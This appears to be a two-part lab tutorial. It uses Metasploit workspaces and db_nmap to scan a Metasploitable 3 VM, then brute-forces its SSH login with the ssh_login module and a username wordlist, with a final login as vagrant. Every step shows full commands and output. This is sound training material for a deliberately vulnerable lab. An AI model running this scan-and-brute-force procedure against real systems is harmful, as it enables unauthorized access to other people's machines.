Workspace Lab
Create and manage Metasploit workspaces, then use Nmap to scan a Metasploitable 3 VM and store reconnaissance data for later exploitation.
// Overview

What Are Workspaces?

A Metasploit workspace is essentially a save state for your reconnaissance. When scanning a network for open ports and services, you don't want to start over every session. Workspaces let you store Nmap results — including open ports, running services, and OS fingerprints — organized by target environment.

// WHY THIS MATTERS In a real engagement, you might be testing multiple networks or returning to a target days later. Workspaces keep your data organized and persistent inside the Metasploit database, powered by PostgreSQL.
// Step 01

Open Terminal & Become Root

Open your Kali Linux VM terminal and escalate to root so all subsequent commands run with full privileges.

┌──(kali⊕kali)-[~]
└─$ sudo su
[sudo] password for kali:
┌──(root⊕kali)-[/home/kali]
#
// Step 02

Start PostgreSQL Service

Metasploit uses PostgreSQL as its backend database. Start the service and verify it's running.

# service postgresql start

# service postgresql status
● postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled)
   Active: active (exited) since Fri 2022-09-09 22:02:28 EDT
// TIP If the terminal freezes after checking status, press Ctrl + C to return to the prompt.
// Step 03

Initialize the MSF Database

Before using workspaces, initialize the Metasploit database so it's ready to store reconnaissance data.

# msfdb init
[+] Starting database
// Step 04

Launch msfconsole

Enter the Metasploit console. Use the -q flag to skip the banner and launch in quiet mode.

# msfconsole -q
msf6 >
// FLAG EXPLAINED msfconsole launches with the full Metasploit banner. Adding -q (quiet mode) skips it for a cleaner session start.
// Step 05

View Existing Workspaces

Check which workspaces exist and which one is currently active. Use workspace -v for verbose output showing hosts, services, vulns, and creds.

Create a New Workspace

// Step 07

Launch Metasploitable 3 & Find its IP

Start your Metasploitable 3 VM and find its IPv4 address. Make sure both Kali and Metasploitable 3 are on the same NAT Network.

Ethernet adapter Local Area Connection:

  Connection-specific DNS Suffix :

// NOTE The IP address 10.0.2.20 is from this lab environment. Your Metasploitable 3 IP may be different — always verify with ipconfig (Windows) or ip a (Linux) on the target machine.
// Step 08

Run db_nmap Against the Target

Use db_nmap instead of plain nmap — it automatically saves results to your active workspace. This scan checks all ports, detects running services, and fingerprints the OS. It can take up to 5 minutes.

msf6 > db_nmap -p- -sV -O 10.0.2.20
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 22:37 EDT
flag breakdown 
-p-     # Scan ALL 65,535 ports (not just common ones)
-sV     # Detect service versions running on each port
-O      # Fingerprint the target operating system
// Step 09

Verify Workspace Was Updated

After the scan completes, run workspace -v again to confirm the services count updated in the meta3 workspace.

Part 2 of 2 — Requires Part 1
SSH Brute Force Lab
Using the workspace data from Part 1, exploit the open SSH port on Metasploitable 3 by running a brute force credential attack with the Metasploit auxiliary module.
// Overview

Exploiting an Open SSH Port

SSH (Secure Shell) on port 22 was discovered during our Nmap scan. If weak or default credentials are in use, it becomes an easy entry point. In this lab we use Metasploit's ssh_login auxiliary module to automate a brute force attack using a known wordlist.

// PREREQUISITE This lab continues from Part 1. You need the meta3 workspace populated with Nmap data before proceeding.
// Step 01

Open Terminal & Become Root

Open a fresh Kali Linux terminal session and escalate to root.

└─$ sudo su
#
// Step 02

Start PostgreSQL & Init MSF Database

Start the database service and re-initialize msfdb. Since you already ran this in Part 1, it will detect the existing database and skip re-initialization.

# service postgresql start

# msfdb init
[i] Database already started
[i] The database appears to be already configured, skipping initialization
// Step 03

Launch msfconsole

# msfconsole -q
msf6 >
// Step 04

Switch to the Correct Workspace

Verify which workspace has your Nmap data. Switch to meta3 if you're not already on it.

msf6 > workspace -v

current  name     hosts  services  vulns  creds  loots  notes
         default  0      0         0      0      0      0
*        meta3    1      19        0      0      0      2

# If not on meta3, switch with:
msf6 > workspace meta3
// Step 05

View Services & Search SSH Modules

Confirm the SSH port is visible, then search for auxiliary modules targeting SSH.

msf6 > services
10.0.2.20   22   tcp   ssh   open   OpenSSH 7.1 protocol 2.0
...

msf6 > search type:aux ssh

Matching Modules
════════════════
 #   Name                                                   Disclosure
 ─   ────
 0   auxiliary/scanner/ssh/apache_karaf_command_execution  2016-02-09
 1   auxiliary/scanner/ssh/karaf_login
 ...
 15  auxiliary/scanner/ssh/ssh_login
// Step 06

Load the ssh_login Module

Select module 15 — auxiliary/scanner/ssh/ssh_login — which is designed to brute force SSH login credentials.

msf6 > use 15
msf6 auxiliary(scanner/ssh/ssh_login) >
// Step 07

Review & Configure Module Options

Run options to see all configurable parameters, then set the target IP (RHOSTS).

msf6 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required
   ────              ───────────────  ────────
   BLANK_PASSWORDS   false            no
   BRUTEFORCE_SPEED  5                yes
   PASS_FILE                           no
   RHOSTS                               yes
   RPORT             22                yes
   USER_FILE                           no

msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.0.2.20
rhosts => 10.0.2.20
// Step 08

Set the Username Wordlist

Point the module to a file containing usernames to try. Metasploit ships with several wordlists — we'll use the Unix users list.

msf6 auxiliary(scanner/ssh/ssh_login) > set user_file /usr/share/wordlists/metasploit/unix_users.txt
user_file => /usr/share/wordlists/metasploit/unix_users.txt
// Step 09

Set user_as_pass & Enable Verbose

Setting user_as_pass true tells the module to try each username as its own password — a common pattern for default or misconfigured credentials. Enable verbose to monitor progress live.

msf6 auxiliary(scanner/ssh/ssh_login) > set user_as_pass true
user_as_pass => true

msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
// WHY user_as_pass? Many systems — especially defaults or poorly configured ones — use identical usernames and passwords (e.g., admin/admin, vagrant/vagrant). This technique tests that pattern across every username in the wordlist without needing a separate password file.
// Step 10

Run the Attack & Verify Results

Execute the module. When complete, check the workspace to see vulns and creds updated.

msf6 auxiliary(scanner/ssh/ssh_login) > run
...

msf6 auxiliary(scanner/ssh/ssh_login) > workspace -v

current  name     hosts  services  vulns  creds  loots  notes
         default  0      0         0      0      0      0
*        meta3    1      19        1      1      0      2
// SUCCESS The vulns and creds columns both updated to 1 — a credential was successfully brute forced!
// Step 11

View Credentials & SSH Into the Target

Run creds to see the discovered credential, then use it to SSH directly into the Metasploitable 3 machine.

msf6 auxiliary(scanner/ssh/ssh_login) > creds

Credentials
═══════════

# ssh vagrant@10.0.2.20

Last login: Mon Sep 12 11:23:36 2022 from 10.0.2.15
-sh-4.3$
